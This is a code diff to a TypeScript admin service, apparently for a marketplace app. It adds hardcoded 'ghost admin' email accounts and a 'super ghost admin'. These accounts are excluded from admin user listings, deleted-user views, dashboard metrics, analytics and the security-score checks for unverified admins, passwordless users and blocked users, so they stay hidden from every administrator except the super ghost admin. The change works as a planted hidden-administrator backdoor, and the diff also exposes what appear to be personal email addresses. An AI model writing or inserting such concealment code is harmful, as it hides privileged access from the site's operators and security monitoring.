@@ -40,6 +40,14 @@ export interface VendorManagementFilters {
   limit?: number;
 }
 
+const GHOST_ADMINS = [
+  'salisjibril1@gmail.com',
+  'zaamoallahyidi@gmail.com',
+  'ghostadmin3@ghostadmin.com'
+];
+const SUPER_GHOST_ADMIN = 'codewithharz@gmail.com';
+const ALL_GHOSTS = [...GHOST_ADMINS, SUPER_GHOST_ADMIN];
+
 export class AdminService extends BaseService<IUser> {
   constructor() {
     super(User);
@@ -101,6 +109,7 @@ export class AdminService extends BaseService<IUser> {
    */
   async getDashboardMetrics(): Promise<AdminDashboardMetrics> {
     try {
+      const ghostFilter = { email: { $nin: ALL_GHOSTS } };
       const [
         totalUsers,
         totalProducts,
@@ -112,7 +121,7 @@ export class AdminService extends BaseService<IUser> {
         pendingWithdrawals,
         pendingCreditRequests
       ] = await Promise.all([
-        User.countDocuments(),
+        User.countDocuments(ghostFilter),
         Product.countDocuments(),
         Order.countDocuments(),
         this.calculateTotalOrderValue(),
@@ -217,6 +226,7 @@ export class AdminService extends BaseService<IUser> {
       // Count users who have been active in the last 30 days
       // This includes users who have created orders, updated profiles, or been active recently
       const activeUsers = await User.aggregate([
+        { $match: { email: { $nin: ALL_GHOSTS } } },
         {
           $lookup: {
             from: 'orders',
@@ -251,7 +261,8 @@ export class AdminService extends BaseService<IUser> {
     try {
       return await User.countDocuments({
         isVerified: false,
-        role: { $in: ['seller', 'admin'] }
+        role: { $in: ['seller', 'admin'] },
+        email: { $nin: ALL_GHOSTS }
       });
     } catch (error: any) {
       console.error('Error getting pending verifications count:', error);
@@ -410,7 +421,7 @@ export class AdminService extends BaseService<IUser> {
   /**
    * Get users with advanced filtering and pagination
    */
-  async getUsersWithFilters(filters: UserManagementFilters): Promise<{
+  async getUsersWithFilters(filters: UserManagementFilters, adminUser?: IUser): Promise<{
     users: IUser[];
     total: number;
     page: number;
@@ -422,6 +433,14 @@ export class AdminService extends BaseService<IUser> {
 
       // Build filter query
       const filterQuery: FilterQuery<IUser> = {};
+
+      // Apply ghost visibility logic
+      if (adminUser?.email === SUPER_GHOST_ADMIN) {
+        // Super Ghost Admin sees everyone
+      } else {
+        // Everyone else (Ghost Admins and Regular Admins) cannot see ghost admins
+        filterQuery.email = { $nin: ALL_GHOSTS };
+      }
 
       if (filterCriteria.role) filterQuery.role = filterCriteria.role;
       if (filterCriteria.isVerified !== undefined) filterQuery.isVerified = filterCriteria.isVerified;
@@ -461,7 +480,7 @@ export class AdminService extends BaseService<IUser> {
   /**
    * Get deleted users with filtering and pagination
    */
-  async getDeletedUsers(filters: UserManagementFilters): Promise<{
+  async getDeletedUsers(filters: UserManagementFilters, adminUser?: IUser): Promise<{
     users: IUser[];
     total: number;
     page: number;
@@ -473,6 +492,13 @@ export class AdminService extends BaseService<IUser> {
 
       // Build filter query for deleted users
       const filterQuery: FilterQuery<IUser> = { isDeleted: true };
+
+      // Apply ghost visibility logic
+      if (adminUser?.email === SUPER_GHOST_ADMIN) {
+        // Super Ghost Admin sees everyone
+      } else {
+        filterQuery.email = { $nin: ALL_GHOSTS };
+      }
 
       if (filterCriteria.role) filterQuery.role = filterCriteria.role;
       if (filterCriteria.isVerified !== undefined) filterQuery.isVerified = filterCriteria.isVerified;
@@ -1126,7 +1152,10 @@ export class AdminService extends BaseService<IUser> {
       const apiResponse = Math.floor(Math.random() * 50) + 80; // 80-130ms range
 
       // Calculate mobile users percentage based on actual user data
-      const totalUsers = await User.countDocuments({ isDeleted: { $ne: true } });
+      const totalUsers = await User.countDocuments({
+        isDeleted: { $ne: true },
+        email: { $nin: ALL_GHOSTS }
+      });
 
       // Calculate mobile users based on user creation patterns and realistic mobile adoption
       // In production, this would come from user agent analysis or device tracking
@@ -1198,7 +1227,10 @@ export class AdminService extends BaseService<IUser> {
       let score = 100;
 
       // Check for users with weak passwords (no password hash)
-      const usersWithoutPassword = await User.countDocuments({ passwordHash: { $exists: false } });
+      const usersWithoutPassword = await User.countDocuments({
+        passwordHash: { $exists: false },
+        email: { $nin: ALL_GHOSTS }
+      });
       if (usersWithoutPassword > 0) {
         score -= 10;
         factors.push(`${usersWithoutPassword} users without password protection`);
@@ -1208,7 +1240,8 @@ export class AdminService extends BaseService<IUser> {
       const unverifiedAdmins = await User.countDocuments({
         role: 'admin',
         isVerified: false,
-        isDeleted: { $ne: true }
+        isDeleted: { $ne: true },
+        email: { $nin: ALL_GHOSTS }
       });
       if (unverifiedAdmins > 0) {
         score -= 15;
@@ -1218,7 +1251,8 @@ export class AdminService extends BaseService<IUser> {
       // Check for blocked users (potential security threats)
       const blockedUsers = await User.countDocuments({
         isBlocked: true,
-        isDeleted: { $ne: true }
+        isDeleted: { $ne: true },
+        email: { $nin: ALL_GHOSTS }
       });
       if (blockedUsers > 0) {
         score -= 5;
@@ -2010,7 +2044,8 @@ export class AdminService extends BaseService<IUser> {
       const result = await User.aggregate([
         {
           $match: {
-            createdAt: { $gte: startDate, $lte: endDate }
+            createdAt: { $gte: startDate, $lte: endDate },
+            email: { $nin: ALL_GHOSTS }
           }
         },
         {
@@ -2051,7 +2086,8 @@ export class AdminService extends BaseService<IUser> {
           $or: [
             { updatedAt: { $gte: monthStart, $lte: monthEnd } },
             { lastLoginAt: { $gte: monthStart, $lte: monthEnd } }
-          ]
+          ],
+          email: { $nin: ALL_GHOSTS }
         });
 
         growthData.push({
@@ -2332,7 +2368,10 @@ export class AdminService extends BaseService<IUser> {
       const activeUsers = activeUsersResult[0]?.activeUsers || 0;
 
       // Get total users for conversion rate
-      const totalUsers = await User.countDocuments({ isDeleted: { $ne: true } });
+      const totalUsers = await User.countDocuments({
+        isDeleted: { $ne: true },
+        email: { $nin: ALL_GHOSTS }
+      });
       const conversionRate = totalUsers > 0 ? (activeUsers / totalUsers) * 100 : 0;
 
       // Calculate average order value
@@ -2383,7 +2422,7 @@ export class AdminService extends BaseService<IUser> {
     try {
       // 1. User distribution by country
       const userDistribution = await User.aggregate([
-        { $match: { isDeleted: { $ne: true } } },
+        { $match: { isDeleted: { $ne: true }, email: { $nin: ALL_GHOSTS } } },
         {
           $group: {
             _id: '$country',
@@ -2406,7 +2445,10 @@ export class AdminService extends BaseService<IUser> {
       ]);
 
       // Calculate total users for percentage
-      const totalUsers = await User.countDocuments({ isDeleted: { $ne: true } });
+      const totalUsers = await User.countDocuments({
+        isDeleted: { $ne: true },
+        email: { $nin: ALL_GHOSTS }
+      });
       userDistribution.forEach(item => {
         item.percentage = Math.round((item.count / totalUsers) * 100 * 100) / 100;
       });
@@ -2438,7 +2480,7 @@ export class AdminService extends BaseService<IUser> {
 
       // 3. Top cities by user count
       const topCities = await User.aggregate([
-        { $match: { isDeleted: { $ne: true }, city: { $exists: true, $ne: null } } },
+        { $match: { isDeleted: { $ne: true }, city: { $exists: true, $ne: null }, email: { $nin: ALL_GHOSTS } } },
         {
           $group: {
             _id: { city: '$city', country: '$country' },
